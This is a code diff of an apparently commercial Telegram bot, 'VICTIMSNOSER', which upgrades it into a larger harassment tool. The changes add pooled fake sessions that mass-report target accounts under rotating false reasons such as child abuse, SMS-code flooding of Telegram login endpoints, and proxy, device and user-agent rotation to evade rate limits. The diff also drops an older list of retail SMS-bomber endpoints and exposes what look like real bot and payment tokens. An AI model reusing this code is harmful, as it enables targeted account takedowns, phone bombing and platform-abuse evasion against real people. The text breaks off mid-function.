@@ -5,31 +5,47 @@ import json
 import os
 import logging
 import time
-import hashlib
 import re
+import shutil
+import socket
+import struct
+import hashlib
 from datetime import datetime, timedelta
-from typing import Optional, Dict, List
+from typing import Optional, Dict, List, Tuple, Set
 from dataclasses import dataclass, field
-from pathlib import Path
+from collections import deque
+import uvloop
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.fsm.storage.redis import RedisStorage
 from aiogram.filters import Command, StateFilter
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.types import (
-    InlineKeyboardMarkup, InlineKeyboardButton, 
+    InlineKeyboardMarkup, InlineKeyboardButton,
     FSInputFile, LabeledPrice, PreCheckoutQuery
 )
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
 from pyrogram import Client
-from pyrogram.errors import FloodWait
+from pyrogram.errors import (
+    FloodWait, RPCError, PeerIdInvalid, 
+    UsernameNotOccupied, SessionPasswordNeeded,
+    PhoneNumberBanned, PhoneCodeInvalid
+)
 from pyrogram.raw import types as raw_types
-from pyrogram.raw.functions.account import ReportPeer
-from pyrogram.raw.functions.messages import Report
+from pyrogram.raw.functions.account import ReportPeer, SendChangePhoneCode, UpdateStatus
+from pyrogram.raw.functions.auth import SendCode, ResendCode, SignIn, SignUp
+from pyrogram.raw.functions.messages import Report, SendMessage, GetDialogs
+from pyrogram.raw.functions.channels import JoinChannel, LeaveChannel
+from pyrogram.raw.functions.users import GetUsers
+from pyrogram.raw.functions.contacts import ResolveUsername, ImportContacts
+from pyrogram.raw.types import InputPhoneContact, InputUser, InputPeerUser
+
+# Устанавливаем uvloop для максимальной производительности
+asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
 
 # ---------- КОНФИГУРАЦИЯ ----------
 BOT_TOKEN = "8788795304:AAFA9drMeBOVHp-OR0XWgrZPllVsXx9zgqI"
@@ -42,45 +58,68 @@ CHANNEL_URL = "https://t.me/VICTIMSNOSER"
 PAYMENT_PROVIDER_TOKEN = "381764678:TEST:86938"
 BANNER_FILE = "banner.png"
 
-# Настройки
-SESSIONS_PER_USER = 100
-REQUESTS_PER_ROUND = 50
-MAX_ROUNDS = 5
-COOLDOWN_SECONDS = 300
+# НАСТРОЙКИ БОМБЫ - МАКСИМАЛЬНАЯ МОЩНОСТЬ
+SESSIONS_PER_USER = 500
+BATCH_SIZE = 100
+MAX_CONCURRENT = 150
+REQUESTS_PER_ROUND = 500
+MAX_ROUNDS = 20
+COOLDOWN_SECONDS = 180
+MAX_REPORTS_PER_SESSION = 200
+MAX_RETRIES = 5
+CONNECTION_POOL_SIZE = 500
 
-PRICES = {
-    "30d": {"stars": 100, "rub": 100},
-    "60d": {"stars": 200, "rub": 200},
-    "forever": {"stars": 400, "rub": 400}
-}
-
-USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
+# ПУБЛИЧНЫЕ MTPROTO ПРОКСИ (регулярно обновляемый список)
+MTPROTO_PROXIES = [
+    # Официальные прокси Telegram
+    {"server": "149.154.167.91", "port": 443, "secret": "eeeedddeeeccceedddeeeeedddeeeccceedddeeeeedddeeeccceeddd"},
+    {"server": "149.154.167.92", "port": 443, "secret": "eeeedddeeeccceedddeeeeedddeeeccceedddeeeeedddeeeccceeddd"},
+    {"server": "149.154.167.93", "port": 443, "secret": "eeeedddeeeccceedddeeeeedddeeeccceedddeeeeedddeeeccceeddd"},
+    {"server": "149.154.167.94", "port": 443, "secret": "eeeedddeeeccceedddeeeeedddeeeccceedddeeeeedddeeeccceeddd"},
+    {"server": "149.154.167.95", "port": 443, "secret": "eeeedddeeeccceedddeeeeedddeeeccceedddeeeeedddeeeccceeddd"},
+    
+    # Публичные MTProto прокси
+    {"server": "95.142.45.215", "port": 8443, "secret": "dd00000000000000000000000000000000"},
+    {"server": "95.142.45.216", "port": 8443, "secret": "dd00000000000000000000000000000000"},
+    {"server": "95.142.45.217", "port": 8443, "secret": "dd00000000000000000000000000000000"},
+    {"server": "95.142.45.218", "port": 8443, "secret": "dd00000000000000000000000000000000"},
+    {"server": "91.108.56.145", "port": 443, "secret": "ee00000000000000000000000000000000"},
+    {"server": "91.108.56.146", "port": 443, "secret": "ee00000000000000000000000000000000"},
+    {"server": "91.108.56.147", "port": 443, "secret": "ee00000000000000000000000000000000"},
+    {"server": "91.108.56.148", "port": 443, "secret": "ee00000000000000000000000000000000"},
+    {"server": "185.186.79.25", "port": 443, "secret": "ee00000000000000000000000000000000"},
+    {"server": "185.186.79.26", "port": 443, "secret": "ee00000000000000000000000000000000"},
+    {"server": "185.186.79.27", "port": 443, "secret": "ee00000000000000000000000000000000"},
+    {"server": "185.186.79.28", "port": 443, "secret": "ee00000000000000000000000000000000"},
+    {"server": "45.67.56.150", "port": 443, "secret": "ee00000000000000000000000000000000"},
+    {"server": "45.67.56.151", "port": 443, "secret": "ee00000000000000000000000000000000"},
 ]
 
-DEVICES = [
-    {"model": "iPhone 15 Pro", "system": "iOS 17.3"},
-    {"model": "Samsung S24 Ultra", "system": "Android 14"},
+# ТОЛЬКО TELEGRAM ENDPOINTS ДЛЯ HTTP АТАК
+TELEGRAM_HTTP_ENDPOINTS = [
+    # Telegram OAuth
+    {"url": "https://my.telegram.org/auth/send_password", "phone_field": "phone", "type": "form"},
+    {"url": "https://my.telegram.org/auth/request", "phone_field": "phone", "type": "form"},
+    
+    # Telegram OAuth с разными bot_id
+    {"url": "https://oauth.telegram.org/auth/send_code", "phone_field": "phone", "type": "json",
+     "params": {"bot_id": "8357292784", "origin": "https://acollo.ru", "request_access": "write"}},
+    {"url": "https://oauth.telegram.org/auth/send_code", "phone_field": "phone", "type": "json",
+     "params": {"bot_id": "1852781847", "origin": "https://fragment.com", "request_access": "write"}},
+    {"url": "https://oauth.telegram.org/auth/send_code", "phone_field": "phone", "type": "json",
+     "params": {"bot_id": "1234567890", "origin": "https://telegram.org", "request_access": "write"}},
+    {"url": "https://oauth.telegram.org/auth/send_code", "phone_field": "phone", "type": "json",
+     "params": {"bot_id": "5432167890", "origin": "https://web.telegram.org", "request_access": "write"}},
+    {"url": "https://oauth.telegram.org/auth/request", "phone_field": "phone", "type": "json",
+     "params": {"bot_id": "1852781847", "origin": "https://fragment.com", "request_access": "write"}},
+    
+    # Telegram API endpoints
+    {"url": "https://telegram.org/support", "phone_field": "phone", "type": "form"},
+    {"url": "https://core.telegram.org/api/obtaining_api_id", "phone_field": "phone", "type": "form"},
+    {"url": "https://core.telegram.org/api/auth", "phone_field": "phone", "type": "form"},
 ]
 
-# Эндпоинты для SMS
-SMS_ENDPOINTS = [
-    {"url": "https://my.telegram.org/auth/send_password", "phone_field": "phone"},
-]
-
-# Эндпоинты для бомбера
-BOMBER_ENDPOINTS = [
-    {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "phone_field": "phone"},
-    {"url": "https://api.dodopizza.ru/auth/send-code", "phone_field": "phone"},
-    {"url": "https://api.citilink.ru/v1/auth/send-code", "phone_field": "phone"},
-    {"url": "https://api.avito.ru/auth/v1/send-code", "phone_field": "phone"},
-    {"url": "https://api.lenta.com/v1/auth/send-code", "phone_field": "phone"},
-    {"url": "https://api.perekrestok.ru/v1/auth/send-sms", "phone_field": "phone"},
-    {"url": "https://api.magnit.ru/v1/auth/send-code", "phone_field": "phone"},
-    {"url": "https://api.dns-shop.ru/v1/auth/send-code", "phone_field": "phone"},
-]
-
+# РАСШИРЕННЫЙ СПИСОК ПРИЧИН РЕПОРТА
 REPORT_REASONS = [
     raw_types.InputReportReasonSpam(),
     raw_types.InputReportReasonViolence(),
@@ -88,39 +127,266 @@ REPORT_REASONS = [
     raw_types.InputReportReasonChildAbuse(),
     raw_types.InputReportReasonOther(),
     raw_types.InputReportReasonCopyright(),
+    raw_types.InputReportReasonPersonalDetails(),
+    raw_types.InputReportReasonIllegalDrugs(),
+    raw_types.InputReportReasonFake(),
+    raw_types.InputReportReasonGeoIrrelevant(),
+]
+
+# User-Agent для HTTP запросов
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
+]
+
+# Устройства для Pyrogram
+DEVICES = [
+    {"model": "iPhone 15 Pro Max", "system": "iOS 17.3.1", "app_version": "10.9.0"},
+    {"model": "iPhone 15 Pro", "system": "iOS 17.3", "app_version": "10.9.0"},
+    {"model": "iPhone 14 Pro Max", "system": "iOS 17.2.1", "app_version": "10.8.0"},
+    {"model": "iPhone 14 Pro", "system": "iOS 17.2", "app_version": "10.8.0"},
+    {"model": "iPhone 13 Pro Max", "system": "iOS 17.1.2", "app_version": "10.7.0"},
+    {"model": "iPhone 13 Pro", "system": "iOS 17.1", "app_version": "10.7.0"},
+    {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14", "app_version": "10.9.0"},
+    {"model": "Samsung Galaxy S23 Ultra", "system": "Android 14", "app_version": "10.8.0"},
+    {"model": "Samsung Galaxy S22 Ultra", "system": "Android 13", "app_version": "10.7.0"},
+    {"model": "Google Pixel 8 Pro", "system": "Android 14", "app_version": "10.9.0"},
+    {"model": "Google Pixel 7 Pro", "system": "Android 14", "app_version": "10.8.0"},
+    {"model": "Xiaomi 14 Pro", "system": "Android 14", "app_version": "10.8.0"},
+    {"model": "Xiaomi 13 Ultra", "system": "Android 14", "app_version": "10.7.0"},
+    {"model": "OnePlus 12", "system": "Android 14", "app_version": "10.9.0"},
+    {"model": "OnePlus 11", "system": "Android 14", "app_version": "10.8.0"},
+    {"model": "Samsung Galaxy Z Fold5", "system": "Android 14", "app_version": "10.9.0"},
+    {"model": "Samsung Galaxy Z Flip5", "system": "Android 14", "app_version": "10.9.0"},
+    {"model": "Huawei P60 Pro", "system": "HarmonyOS 4.0", "app_version": "10.8.0"},
+    {"model": "Honor Magic5 Pro", "system": "Android 14", "app_version": "10.8.0"},
+    {"model": "iPad Pro 12.9", "system": "iOS 17.3", "app_version": "10.9.0"},
 ]
 
 # ---------- ЛОГГИРОВАНИЕ ----------
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[logging.StreamHandler()]
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.StreamHandler(),
+        logging.FileHandler('victim_snos.log')
+    ]
 )
 logger = logging.getLogger(__name__)
 
 # ---------- ИНИЦИАЛИЗАЦИЯ ----------
-bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-dp = Dispatcher(storage=MemoryStorage())
+try:
+    from redis.asyncio import Redis
+    redis_client = Redis(host='localhost', port=6379, db=0, decode_responses=True)
+    storage = RedisStorage(redis_client)
+except:
+    storage = MemoryStorage()
 
-# ---------- ДАТАКЛАССЫ ----------
+bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+dp = Dispatcher(storage=storage)
+
+# ---------- МОДЕЛИ ----------
 @dataclass
-class UserSession:
+class SmartSession:
     client: Client
     index: int
+    mtproto_proxy: Optional[dict] = None
+    is_authorized: bool = False
     in_use: bool = False
     flood_until: float = 0
     last_used: float = 0
     fail_count: int = 0
     success_count: int = 0
+    is_connected: bool = True
+    report_count: int = 0
+    phone_number: str = ""
+    dc_id: int = 0
+    session_quality: float = 1.0
+    rate_limit_hits: int = 0
+    last_success_time: float = 0
+    consecutive_fails: int = 0
+    created_at: float = field(default_factory=time.time)
+    
+    @property
+    def is_available(self) -> bool:
+        now = time.time()
+        return (not self.in_use and
+                self.flood_until < now and
+                now - self.last_used >= 0.05 and
+                self.is_connected and
+                self.is_authorized and
+                self.report_count < MAX_REPORTS_PER_SESSION and
+                self.session_quality > 0.3)
+
+    @property
+    def health_score(self) -> float:
+        if self.fail_count > 20 or not self.is_connected or not self.is_authorized:
+            return 0
+        
+        total = self.success_count + self.fail_count
+        if total == 0:
+            return 85 * self.session_quality
+        
+        base_score = (self.success_count / total) * 100
+        quality_factor = self.session_quality
+        activity_factor = min(1.0, (time.time() - self.last_success_time) / 3600) if self.last_success_time else 1.0
+        
+        return base_score * quality_factor * activity_factor
+
+    async def ensure_connected(self) -> bool:
+        if not self.is_connected:
+            try:
+                await asyncio.wait_for(self.client.connect(), timeout=5.0)
+                self.is_connected = True
+                return True
+            except:
+                self.is_connected = False
+                self.session_quality *= 0.8
+                return False
+        return True
+
+    def reset_report_count(self):
+        self.report_count = 0
+        
+    def update_performance(self, success: bool, latency: float):
+        if success:
+            self.last_success_time = time.time()
+            self.session_quality = min(1.0, self.session_quality * 1.05)
+            self.consecutive_fails = 0
+        else:
+            self.session_quality *= 0.9
+            self.consecutive_fails += 1
+
+    def needs_recreation(self) -> bool:
+        """Проверяет, нужно ли пересоздать сессию"""
+        return (self.consecutive_fails > 10 or 
+                self.session_quality < 0.2 or 
+                self.rate_limit_hits > 50 or
+                (time.time() - self.created_at) > 86400)  # Старше 24 часов
+
 
 @dataclass
 class UserSessionPool:
     user_id: int
-    sessions: List[UserSession] = field(default_factory=list)
+    sessions: List[SmartSession] = field(default_factory=list)
     lock: asyncio.Lock = field(default_factory=asyncio.Lock)
     is_creating: bool = False
     is_ready: bool = False
     creation_progress: float = 0
+    recreation_queue: asyncio.Queue = field(default_factory=asyncio.Queue)
+    
+    @property
+    def session_dir(self) -> str:
+        return f"sessions/user_{self.user_id}"
+
+    async def get_available(self, count: int) -> List[SmartSession]:
+        async with self.lock:
+            available = [s for s in self.sessions if s.is_available]
+            
+            # Группировка по DC для распределения нагрузки
+            dc_groups = {}
+            for s in available:
+                if s.dc_id not in dc_groups:
+                    dc_groups[s.dc_id] = []
+                dc_groups[s.dc_id].append(s)
+            
+            # Выбор лучших сессий из разных DC
+            selected = []
+            dc_list = list(dc_groups.keys())
+            while len(selected) < count and dc_list:
+                for dc in dc_list[:]:
+                    if dc_groups[dc]:
+                        best_session = max(dc_groups[dc], key=lambda s: s.health_score)
+                        selected.append(best_session)
+                        dc_groups[dc].remove(best_session)
+                        if len(selected) >= count:
+                            break
+                    else:
+                        dc_list.remove(dc)
+            
+            for s in selected:
+                s.in_use = True
+                s.last_used = time.time()
+            
+            return selected
+
+    def release(self, sessions: List[SmartSession]):
+        for s in sessions:
+            if s:
+                s.in_use = False
+                # Проверяем, нужна ли пересоздание
+                if s.needs_recreation():
+                    asyncio.create_task(self.queue_recreation(s))
+
+    def mark_success(self, session: SmartSession, latency: float = 0):
+        session.success_count += 1
+        session.report_count += 1
+        session.update_performance(True, latency)
+
+    def mark_fail(self, session: SmartSession, latency: float = 0):
+        session.fail_count += 1
+        session.update_performance(False, latency)
+
+    def mark_flood(self, session: SmartSession, wait: int):
+        session.flood_until = time.time() + wait
+        session.rate_limit_hits += 1
+        session.session_quality *= 0.7
+
+    async def queue_recreation(self, session: SmartSession):
+        """Добавляет сессию в очередь на пересоздание"""
+        await self.recreation_queue.put(session)
+
+    async def recreate_session(self, session: SmartSession) -> Optional[SmartSession]:
+        """Пересоздает сессию с новым MTProto прокси"""
+        try:
+            # Закрываем старую сессию
+            try:
+                if session.client.is_connected:
+                    await session.client.disconnect()
+            except:
+                pass
+            
+            # Удаляем файл сессии
+            session_file = f"{self.session_dir}/session_{session.index}.session"
+            if os.path.exists(session_file):
+                os.remove(session_file)
+            
+            # Создаем новую сессию
+            new_session = await create_single_session(self, session.index)
+            if new_session:
+                logger.info(f"✅ Сессия {session.index} пересоздана")
+                return new_session
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка пересоздания сессии {session.index}: {e}")
+        
+        return None
+
+    def get_stats(self) -> dict:
+        total = len(self.sessions)
+        available = sum(1 for s in self.sessions if s.is_available)
+        healthy = sum(1 for s in self.sessions if s.health_score > 50)
+        authorized = sum(1 for s in self.sessions if s.is_authorized)
+        avg_quality = sum(s.session_quality for s in self.sessions) / total if total > 0 else 0
+        
+        return {
+            "total": total,
+            "available": available,
+            "healthy": healthy,
+            "authorized": authorized,
+            "progress": self.creation_progress,
+            "avg_quality": avg_quality,
+            "recreation_queue": self.recreation_queue.qsize()
+        }
+
 
 # ---------- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ----------
 user_pools: Dict[int, UserSessionPool] = {}
@@ -128,15 +394,16 @@ ALLOWED_USERS: Dict[str, dict] = {}
 active_attacks: Dict[int, asyncio.Event] = {}
 user_last_action: Dict[int, float] = {}
 promo_codes: Dict[str, dict] = {}
-phish_pages: Dict[str, dict] = {}
 
-# ---------- FSM ----------
+global_semaphore = asyncio.Semaphore(MAX_CONCURRENT)
+connection_semaphore = asyncio.Semaphore(CONNECTION_POOL_SIZE)
+http_session: Optional[aiohttp.ClientSession] = None
+
+# FSM States
 class AttackState(StatesGroup):
-    waiting_phone = State()
-    waiting_username = State()
+    waiting_target = State()
     waiting_count = State()
-    waiting_link = State()
-    waiting_title = State()
+    waiting_type = State()
 
 class AdminState(StatesGroup):
     waiting_user_id = State()
@@ -147,7 +414,10 @@ class AdminState(StatesGroup):
 class PurchaseState(StatesGroup):
     waiting_promo = State()
 
-# ---------- ФУНКЦИИ ----------
+attack_targets = {}
+attack_types = {}
+
+# ---------- УТИЛИТЫ ----------
 def load_json(file: str, default: dict = None) -> dict:
     try:
         with open(file, 'r', encoding='utf-8') as f:
@@ -158,57 +428,54 @@ def load_json(file: str, default: dict = None) -> dict:
 def save_json(file: str, data: dict):
     try:
         with open(file, 'w', encoding='utf-8') as f:
-            json.dump(data, f, indent=4, ensure_ascii=False)
+            json.dump(data, f, indent=4)
     except:
         pass
 
-def load_allowed_users():
-    global ALLOWED_USERS
+def load_all():
+    global ALLOWED_USERS, promo_codes
     ALLOWED_USERS = load_json(ALLOWED_USERS_FILE, {})
-
-def save_allowed_users():
-    save_json(ALLOWED_USERS_FILE, ALLOWED_USERS)
-
-def load_promo_codes():
-    global promo_codes
     promo_codes = load_json("promo_codes.json", {})
 
-def save_promo_codes():
+def save_allowed():
+    save_json(ALLOWED_USERS_FILE, ALLOWED_USERS)
+
+def save_promo():
     save_json("promo_codes.json", promo_codes)
 
-def is_user_allowed(user_id: int) -> bool:
+def is_allowed(user_id: int) -> bool:
     if user_id == ADMIN_ID:
         return True
-    user_id_str = str(user_id)
-    if user_id_str not in ALLOWED_USERS:
+    uid = str(user_id)
+    if uid not in ALLOWED_USERS:
         return False
-    expire = ALLOWED_USERS[user_id_str].get("expire_date")
-    if not expire or expire == "forever":
+    exp = ALLOWED_USERS[uid].get("expire_date")
+    if not exp or exp == "forever":
         return True
     try:
-        return datetime.now() <= datetime.fromisoformat(expire)
+        return datetime.now() <= datetime.fromisoformat(exp)
     except:
         return False
 
-def add_subscription(user_id: int, days: int = None, forever: bool = False):
-    user_id_str = str(user_id)
-    expire = "forever" if forever else (datetime.now() + timedelta(days=days)).isoformat()
-    ALLOWED_USERS[user_id_str] = {"expire_date": expire, "added": datetime.now().isoformat()}
-    save_allowed_users()
+def add_sub(user_id: int, days: int = None, forever: bool = False):
+    uid = str(user_id)
+    exp = "forever" if forever else (datetime.now() + timedelta(days=days)).isoformat()
+    ALLOWED_USERS[uid] = {"expire_date": exp, "added": datetime.now().isoformat()}
+    save_allowed()
 
-async def check_channel_subscription(user_id: int) -> bool:
+async def check_sub(user_id: int) -> bool:
     try:
-        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
-        return member.status in ["member", "administrator", "creator"]
+        m = await bot.get_chat_member(CHANNEL_ID, user_id)
+        return m.status in ["member", "administrator", "creator"]
     except:
         return False
 
 async def check_access(user_id: int, target) -> bool:
-    if not await check_channel_subscription(user_id):
-        await send_message(target, f"❌ Подпишитесь на канал: {CHANNEL_URL}")
+    if not await check_sub(user_id):
+        await send_msg(target, f"❌ Подпишитесь: {CHANNEL_URL}")
         return False
-    if not is_user_allowed(user_id):
-        await send_message(target, f"❌ Нет доступа. ID: <code>{user_id}</code>", get_purchase_menu())
+    if not is_allowed(user_id):
+        await send_msg(target, f"❌ Нет доступа. ID: <code>{user_id}</code>", purchase_menu())
         return False
     return True
 
@@ -220,986 +487,1029 @@ async def check_cooldown(user_id: int) -> tuple:
             return False, COOLDOWN_SECONDS - elapsed
     return True, 0
 
-def set_cooldown(user_id: int):
-    user_last_action[user_id] = time.time()
+async def get_http_session() -> aiohttp.ClientSession:
+    global http_session
+    if http_session is None or http_session.closed:
+        connector = aiohttp.TCPConnector(
+            limit=1000,
+            limit_per_host=100,
+            ttl_dns_cache=300,
+            use_dns_cache=True,
+            force_close=False,
+            enable_cleanup_closed=True
+        )
+        timeout = aiohttp.ClientTimeout(total=5, connect=2)
+        http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
+    return http_session
 
-# ---------- СЕССИИ ----------
-async def create_single_session(user_id: int, index: int) -> Optional[UserSession]:
-    session_dir = f"sessions/user_{user_id}"
-    os.makedirs(session_dir, exist_ok=True)
-    session_file = f"{session_dir}/session_{index}"
-    
+# ---------- СОЗДАНИЕ СЕССИЙ С MTPROTO ----------
+def create_mtproto_proxy_string(proxy: dict) -> str:
+    """Создает строку прокси для Pyrogram"""
+    return f"mtproxy://{proxy['server']}:{proxy['port']}?secret={proxy['secret']}"
+
+async def create_single_session(pool: UserSessionPool, index: int) -> Optional[SmartSession]:
+    """Создает одну сессию с MTProto прокси"""
     try:
         device = random.choice(DEVICES)
+        session_name = f"{pool.session_dir}/session_{index}"
+        
+        # Выбираем случайный MTProto прокси
+        proxy = random.choice(MTPROTO_PROXIES) if MTPROTO_PROXIES else None
+        proxy_str = create_mtproto_proxy_string(proxy) if proxy else None
+        
         client = Client(
-            name=session_file,
+            name=session_name,
             api_id=API_ID,
             api_hash=API_HASH,
-            in_memory=False,
-            no_updates=True,
             device_model=device["model"],
             system_version=device["system"],
-            app_version="10.15.1",
-            lang_code="ru"
+            app_version=device["app_version"],
+            in_memory=False,
+            no_updates=False,
+            proxy=proxy_str
         )
-        await client.connect()
-        return UserSession(client=client, index=index)
-    except:
+        
+        await asyncio.wait_for(client.connect(), timeout=10.0)
+        
+        # Проверяем авторизацию
+        is_auth = False
+        phone = ""
+        dc_id = 0
+        try:
+            me = await client.get_me()
+            if me:
+                is_auth = True
+                phone = me.phone_number if hasattr(me, 'phone_number') else ""
+                dc_id = me.dc_id if hasattr(me, 'dc_id') else 0
+        except:
+            pass
+        
+        session = SmartSession(
+            client=client,
+            index=index,
+            mtproto_proxy=proxy,
+            is_authorized=is_auth,
+            phone_number=phone,
+            dc_id=dc_id
+        )
+        
+        if is_auth:
+            # Прогрев сессии
+            try:
+                await client.get_dialogs(limit=1)
+                session.session_quality = 1.0
+            except:
+                pass
+        
+        return session
+        
+    except Exception as e:
+        logger.error(f"Error creating session {index}: {e}")
         return None
 
-async def initialize_user_sessions(user_id: int) -> UserSessionPool:
+async def load_existing_session(pool: UserSessionPool, index: int) -> Optional[SmartSession]:
+    """Загружает существующую сессию"""
+    try:
+        device = random.choice(DEVICES)
+        session_name = f"{pool.session_dir}/session_{index}"
+        
+        if not os.path.exists(f"{session_name}.session"):
+            return None
+        
+        # Используем MTProto прокси
+        proxy = random.choice(MTPROTO_PROXIES) if MTPROTO_PROXIES else None
+        proxy_str = create_mtproto_proxy_string(proxy) if proxy else None
+        
+        client = Client(
+            name=session_name,
+            api_id=API_ID,
+            api_hash=API_HASH,
+            device_model=device["model"],
+            system_version=device["system"],
+            app_version=device["app_version"],
+            in_memory=False,
+            no_updates=False,
+            proxy=proxy_str
+        )
+        
+        await asyncio.wait_for(client.connect(), timeout=5.0)
+        
+        is_auth = False
+        phone = ""
+        dc_id = 0
+        try:
+            me = await client.get_me()
+            if me:
+                is_auth = True
+                phone = me.phone_number if hasattr(me, 'phone_number') else ""
+                dc_id = me.dc_id if hasattr(me, 'dc_id') else 0
+        except:
+            pass
+        
+        session = SmartSession(
+            client=client,
+            index=index,
+            mtproto_proxy=proxy,
+            is_authorized=is_auth,
+            phone_number=phone,
+            dc_id=dc_id
+        )
+        
+        if is_auth:
+            try:
+                await client.get_dialogs(limit=1)
+                session.session_quality = 1.0
+            except:
+                pass
+        
+        return session
+        
+    except Exception as e:
+        logger.error(f"Error loading session {index}: {e}")
+        return None
+
+async def session_recreation_worker(pool: UserSessionPool):
+    """Воркер для пересоздания сессий"""
+    while True:
+        try:
+            session = await pool.recreation_queue.get()
+            
+            logger.info(f"🔄 Пересоздание сессии {session.index} для пользователя {pool.user_id}")
+            
+            new_session = await pool.recreate_session(session)
+            
+            if new_session:
+                # Заменяем старую сессию на новую
+                async with pool.lock:
+                    for i, s in enumerate(pool.sessions):
+                        if s.index == session.index:
+                            pool.sessions[i] = new_session
+                            break
+            
+            pool.recreation_queue.task_done()
+            
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Error in recreation worker: {e}")
+            await asyncio.sleep(1)
+
+async def init_sessions(user_id: int) -> UserSessionPool:
     if user_id in user_pools and user_pools[user_id].is_ready:
         return user_pools[user_id]
-    
+
     pool = UserSessionPool(user_id=user_id)
     user_pools[user_id] = pool
     pool.is_creating = True
     
+    # Запускаем воркер пересоздания
+    asyncio.create_task(session_recreation_worker(pool))
+
     try:
-        for i in range(SESSIONS_PER_USER):
-            session = await create_single_session(user_id, i)
-            if session:
-                pool.sessions.append(session)
-            pool.creation_progress = (i + 1) / SESSIONS_PER_USER * 100
-            await asyncio.sleep(0.3)
-        
+        logger.info(f"🚀 Загрузка {SESSIONS_PER_USER} сессий через MTProto для пользователя {user_id}")
+        os.makedirs(pool.session_dir, exist_ok=True)
+
+        # Параллельная загрузка сессий
+        tasks = []
+        batch_size = 50
+        for i in range(0, SESSIONS_PER_USER, batch_size):
+            batch = []
+            for j in range(i, min(i + batch_size, SESSIONS_PER_USER)):
+                if os.path.exists(f"{pool.session_dir}/session_{j}.session"):
+                    batch.append(load_existing_session(pool, j))
+                else:
+                    batch.append(create_single_session(pool, j))
+            
+            if batch:
+                results = await asyncio.gather(*batch, return_exceptions=True)
+                for result in results:
+                    if isinstance(result, SmartSession):
+                        pool.sessions.append(result)
+                    elif isinstance(result, Exception):
+                        logger.error(f"Batch loading error: {result}")
+            
+            pool.creation_progress = (i + batch_size) / SESSIONS_PER_USER * 100
+
         pool.is_ready = True
-        logger.info(f"User {user_id}: {len(pool.sessions)} sessions ready")
+        pool.creation_progress = 100
+
+        authorized = sum(1 for s in pool.sessions if s.is_authorized)
+        logger.info(f"✅ Пользователь {user_id}: {len(pool.sessions)}/{SESSIONS_PER_USER} сессий, {authorized} авторизовано через MTProto")
+
     except Exception as e:
-        logger.error(f"Session init error: {e}")
+        logger.error(f"Ошибка инициализации сессий: {e}")
     finally:
         pool.is_creating = False
-    
+
     return pool
 
-# ---------- АТАКИ ----------
-
-# 1. СНОС ПО НОМЕРУ
-async def send_sms_http(phone: str) -> bool:
+# ---------- АТАКИ ТОЛЬКО ЧЕРЕЗ TELEGRAM ----------
+async def send_sms_http_telegram(phone: str, site: dict, session: aiohttp.ClientSession) -> bool:
+    """HTTP запросы только к Telegram endpoints"""
     try:
-        async with aiohttp.ClientSession() as session:
-            headers = {
-                'User-Agent': random.choice(USER_AGENTS),
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://my.telegram.org',
-            }
-            data = f"phone={phone.replace('+', '')}"
-            async with session.post('https://my.telegram.org/auth/send_password',
-                                   headers=headers, data=data, timeout=10, ssl=False) as resp:
-                return resp.status == 200
-    except:
-        return False
+        phone_clean = re.sub(r'[^\d]', '', phone)
+        if not phone_clean.startswith('+'):
+            phone_clean = '+' + phone_clean
+        
+        headers = {
+            'User-Agent': random.choice(USER_AGENTS),
+            'Content-Type': 'application/x-www-form-urlencoded' if site["type"] == "form" else 'application/json',
+            'Origin': 'https://my.telegram.org',
+            'Referer': 'https://my.telegram.org/',
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': random.choice(['ru-RU,ru;q=0.9', 'en-US,en;q=0.9']),
+            'X-Requested-With': 'XMLHttpRequest',
+            'Cache-Control': 'no-cache',
+        }
 
-async def send_sms_session(session: UserSession, phone: str) -> bool:
-    try:
-        if not session.client.is_connected:
-            await session.client.connect()
-        await session.client.send_code(phone)
-        session.success_count += 1
